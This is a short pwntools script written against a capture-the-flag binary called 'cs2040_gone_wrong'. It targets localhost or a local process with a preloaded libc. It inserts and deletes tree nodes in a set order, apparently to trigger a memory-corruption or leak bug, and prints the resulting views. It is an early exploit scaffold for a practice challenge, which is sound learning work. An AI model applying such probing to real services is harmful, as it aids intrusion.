from pwn import *

context.terminal = ["cmd.exe", "/c", "wt.exe", "nt", "-H", "wsl.exe", "--", "sh", "-c"]

if args.REMOTE:
    p = remote('localhost', 5003)
else:
    p = process('./dist/cs2040_gone_wrong.o', env = {'LD_PRELOAD': './dist/libc.so.6'})

def insert(v):
    p.sendlineafter('Option: ', '1')
    p.sendlineafter('Node Value: ', str(v))


def delete(v):
    p.sendlineafter('Option: ', '2')
    p.sendlineafter('Node Value: ', str(v))

def view():
    p.sendlineafter('Option: ', '3')
    return p.recvline()

insert(100)

insert(50)
insert(35)
insert(70)

insert(105)


info(view())

# gdb.attach(p)
delete(50)
delete(105)
success(view())
delete(70)

success(view())